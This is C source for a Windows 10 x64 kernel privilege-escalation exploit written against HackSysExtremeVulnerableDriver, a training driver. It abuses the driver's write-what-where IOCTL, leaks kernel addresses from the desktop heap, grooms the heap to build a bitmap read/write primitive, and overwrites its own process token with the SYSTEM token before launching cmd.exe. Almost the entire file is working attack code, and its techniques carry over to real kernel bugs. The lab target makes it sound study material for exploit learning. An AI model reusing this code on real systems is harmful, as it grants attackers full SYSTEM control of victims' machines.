#include<stdio.h>
#include "struct.h"

HANDLE hDevice = NULL;
lHMValidateHandle pHmValidateHandle = NULL;
DWORD64 win32ClientInfo = 0;
DWORD64 UserKernelDesktopHeap = 0;
DWORD64 kernelDesktopHeap = 0;
DWORD64 ulClientDelta = 0;
HBMP workerBmp;
HBMP managerBmp;

/************************************************************************/
/*                 Write by Thunder_J 2019.8                            */
/*                     Write-What-Where                                 */
/*				    Windows 10 x64 1703									*/
/************************************************************************/

BOOL init()
{
	printf("[+]Start to get HANDLE");
	// Get HANDLE
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		return FALSE;
	}
	printf(" => done!\n");
	return TRUE;
}

VOID Trigger_shellcode(UINT64 where, UINT64 what)
{

	WRITE_WHAT_WHERE exploitlow;
	WRITE_WHAT_WHERE exploithigh;
	DWORD lpbReturn = 0;

	UINT32 lowValue = what;
	UINT32 highvalue = (what >> 0x20);

	exploitlow.What = (PULONG_PTR)& what;
	exploitlow.Where = (PULONG_PTR)where;

	printf("[+]Start to trigger ");

	DeviceIoControl(hDevice,
		0x22200B,
		&exploitlow,
		0x10,
		NULL,
		0,
		&lpbReturn,
		NULL);

	exploithigh.What = (PULONG_PTR)& highvalue;
	exploithigh.Where = (PULONG_PTR)(where + 0x4);

	DeviceIoControl(hDevice,
		0x22200B,
		&exploithigh,
		0x10,
		NULL,
		0,
		&lpbReturn,
		NULL);

	printf("=> done!\n");
}

BOOL FindHMValidateHandle() {
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("Failed to load user32");
		return FALSE;
	}

	BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
		return FALSE;
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
		return FALSE;
	}

	unsigned int addr = *(unsigned int*)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	//The +11 is to skip the padding bytes as on Windows 10 these aren't nops
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	printf("[+]HMValidateHandle address is : 0x%p\n", pHmValidateHandle);
	return TRUE;
}

DWORD64 leakBitmap()
{
	/*
	*[+]Get Client Delta
	*/
	printf("[+]Start to get Client Delta");

	DWORD64 tebBase = (DWORD64)NtCurrentTeb();
	
	UserKernelDesktopHeap = *(PDWORD64)(tebBase + 0x828);
	
	kernelDesktopHeap = *(PDWORD64)(UserKernelDesktopHeap + 0x28);
	
	ulClientDelta = kernelDesktopHeap - UserKernelDesktopHeap;
	
	printf(" => done!\n");

	printf("[+]Client Delta address is 0x%p\n", ulClientDelta);

	return 0;
}

DWORD64 leakWnd(HWND leakWnd)
{
	/*
	*[+]Leak Wnd address
	*/
	PDWORD64 buffer = (PDWORD64)UserKernelDesktopHeap;

	DWORD i = 0;
	while (1)
	{
		if (buffer[i] == (DWORD64)leakWnd)
		{
			printf("[+]Wnd address is 0x%p\n", (DWORD64)(buffer + i));
			return (DWORD64)(buffer + i);
		}
		i++;
	}

}

DWORD64 lpszMenuName(HWND hwnd)
{
	leakBitmap();

	DWORD64 wndaddr = leakWnd(hwnd);
	
	DWORD64 kernelTagCls = *(PDWORD64)(wndaddr + 0xa8);
	
	DWORD64 lpszNamemenuAddr = *(PDWORD64)(kernelTagCls - ulClientDelta + 0x90);

	printf("[+]kernel address lpszMenuName at: 0x%p\n", lpszNamemenuAddr);

	return lpszNamemenuAddr;
}

HBMP leak()
{
	HBMP hbmp;
	DWORD64 curr = 0;
	DWORD64 prev = 1;
	/*
	*[+]Heap spray biu biu biu ~
	*/
	for (int i = 0; i < 0x700; i++)
	{
		char buf[0x8f0];
		memset(buf, 0x41, 0x8f0);
		WNDCLASSEX wnd = { 0x0 };
		wnd.cbSize = sizeof(wnd);
		wnd.lpszClassName = TEXT("case");
		wnd.lpszMenuName = buf;
		wnd.lpfnWndProc = DefWindowProc;
		int result = RegisterClassExA(&wnd);

		if (!result)
		{
			printf("RegisterClassEx error: %d\r\n", GetLastError());
		}

		HWND test = CreateWindowExA(
			0,
			wnd.lpszClassName,
			TEXT("WORDS"),
			0,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			NULL, NULL, NULL, NULL);
		curr = lpszMenuName(test);

		/*
		*[+]If they are equal, we can get a stable address :)
		*/
		if (curr == prev)
		{
			DestroyWindow(test);
			UnregisterClassA(wnd.lpszClassName, NULL);
			WCHAR* Buff = (WCHAR*)malloc(sizeof(WCHAR) * 0x50 * 2 * 4);
			RtlSecureZeroMemory(Buff, 0x50 * 2 * 4);
			RtlFillMemory(Buff, 0x50 * 2 * 4, '\x41');
			hbmp.hBmp = CreateBitmap(0x701, 2, 1, 8, Buff);
			hbmp.kAddr = curr;
			hbmp.pvScan0 = (PUCHAR)(curr + 0x50);

			return hbmp;
		}

		DestroyWindow(test);
		UnregisterClassA(wnd.lpszClassName, NULL);
		prev = curr;
	}
	return hbmp;
}

VOID Leak_Trigger()
{
	/*
	*[+]Step1:Get HMValidateHandle address
	*/
	BOOL bFound = FindHMValidateHandle();
	if (!bFound) {
		printf("Failed to locate HmValidateHandle, exiting\n");
		return;
	}

	/*
	*[+]Step2:Define window
	*/
	WNDCLASSEX wnd = { 0x0 };
	wnd.cbSize = sizeof(wnd);
	wnd.lpszClassName = TEXT("MainWClass");
	wnd.lpszMenuName = TEXT("AAAAA");
	wnd.lpfnWndProc = DefWindowProc;
	int result = RegisterClassEx(&wnd);
	if (!result)
	{
		printf("RegisterClassEx error: %d\r\n", GetLastError());
	}

	/*
	*[+]Step3:Create window
	*/
	HWND test = CreateWindowEx(
		0,
		wnd.lpszClassName,
		TEXT("WORDS"),
		0,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		NULL, NULL, NULL, NULL);

	/*
	*[+]Step4:Compute address of Bitmap
	*/
	managerBmp = leak();
	workerBmp = leak();

	printf("[+]ManagerBmp address leak pvScan0 at: 0x%p\n", managerBmp.pvScan0);
	printf("[+]WorkerBmp address leak pvScan0 at: 0x%p\n", workerBmp.pvScan0);

	/*
	*[+]Step5:You know it => Write What Where
	*/
	Trigger_shellcode((DWORD64)managerBmp.pvScan0, (DWORD64)workerBmp.pvScan0);
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

VOID readOOB(DWORD64 whereRead, LPVOID whatValue, int len)
{
	SetBitmapBits(managerBmp.hBmp, len, &whereRead);
	GetBitmapBits(workerBmp.hBmp, len, whatValue);	// read
}

VOID writeOOB(DWORD64 whereWrite, LPVOID whatValue, int len)
{
	SetBitmapBits(managerBmp.hBmp, len, &whereWrite);
	SetBitmapBits(workerBmp.hBmp, len, &whatValue);	// write
}

DWORD64 stealToken()
{
	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL)
	{
		printf("[+]Failed to get NtQuerySystemInformation\n");
		return NULL;
	}

	DWORD len;

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

	PSYSTEM_MODULE_INFORMATION moduleInfo = NULL;
	moduleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!moduleInfo)
	{
		printf("[+]Failed to get moduleInfo\n");
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, moduleInfo, len, &len);

	LPVOID kernelBase = moduleInfo->Module[0].ImageBase;
	LPVOID kernelImage = moduleInfo->Module[0].FullPathName;
	printf("[+]kernel base address is at: 0x%p\n", kernelBase);

	LPCSTR lpkernelName = (LPCSTR)(moduleInfo->Module[0].FullPathName + moduleInfo->Module[0].OffsetToFileName);
	printf("[+]kernel name is: %s\n", lpkernelName);

	HMODULE hUserSpacekernel = LoadLibraryExA(lpkernelName, 0, 0);

	if (hUserSpacekernel == NULL)
	{
		VirtualFree(moduleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	FARPROC pUserKernelSymbol = GetProcAddress(hUserSpacekernel, "PsInitialSystemProcess");

	if (pUserKernelSymbol == NULL)
	{
		VirtualFree(moduleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	FARPROC pLiveFunctionAddress = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpacekernel + (PUCHAR)kernelBase);

	FreeLibrary(hUserSpacekernel);
	VirtualFree(moduleInfo, 0, MEM_RELEASE);

	LPVOID lpSystemEPROCESS = NULL;
	LPVOID lpSysProcID = NULL;
	LPVOID lpSystemToken = NULL;
	LIST_ENTRY lpNextEntryAddreess;
	readOOB((DWORD64)pLiveFunctionAddress, &lpSystemEPROCESS, sizeof(LPVOID));
	readOOB((DWORD64)((PUCHAR)lpSystemEPROCESS + 0x2e8), &lpSysProcID, sizeof(LPVOID));
	readOOB((DWORD64)((PUCHAR)lpSystemEPROCESS + 0x358), &lpSystemToken, sizeof(LPVOID));
	readOOB((DWORD64)((PUCHAR)lpSystemEPROCESS + 0x2f0), &lpNextEntryAddreess, sizeof(LIST_ENTRY));

	printf("[+]system process address is: 0x%p\n", lpSystemEPROCESS);
	printf("[+]Next Process AT: 0x%p\n", lpNextEntryAddreess.Flink);
	printf("[+]system process token value is: 0x%p\n", lpSystemToken);
	printf("[+]system process PID is: 0x%p\n", lpSysProcID);

	DWORD64 currentProcessID = GetCurrentProcessId();

	LPVOID lpNextEPROCESS = NULL;
	LPVOID lpCurrentPID = NULL;
	LPVOID lpCurrentToken = NULL;
	DWORD dwCurrentPID;
	do
	{
		lpNextEPROCESS = (PUCHAR)lpNextEntryAddreess.Flink - 0x2e8;
		readOOB((DWORD64)((PUCHAR)lpNextEPROCESS + 0x2e0), &lpCurrentPID, sizeof(LPVOID));
		dwCurrentPID = LOWORD(lpCurrentPID);
		readOOB((DWORD64)((PUCHAR)lpNextEPROCESS + 0x2e8), &lpNextEntryAddreess, sizeof(LIST_ENTRY));
	} while (dwCurrentPID != currentProcessID);

	DWORD64 currentTokenAddress = (DWORD64)lpNextEPROCESS + 0x358;
	printf("[+]Start to write token");
	writeOOB(currentTokenAddress, lpSystemToken, sizeof(LPVOID));
	printf(" => done!\n");
}

/*
*[+]Learn from wjllz : https://github.com/redogwu/windows_kernel_exploit
*[+]Hope can help you :)
*/

int main()
{
	if (init() == FALSE)
	{
		printf("[+]Failed to get HANDLE!!!\n");
		system("pause");
		return -1;
	}

	Leak_Trigger();

	stealToken();

	CreateCmd();
	system("pause");
	return 0;
}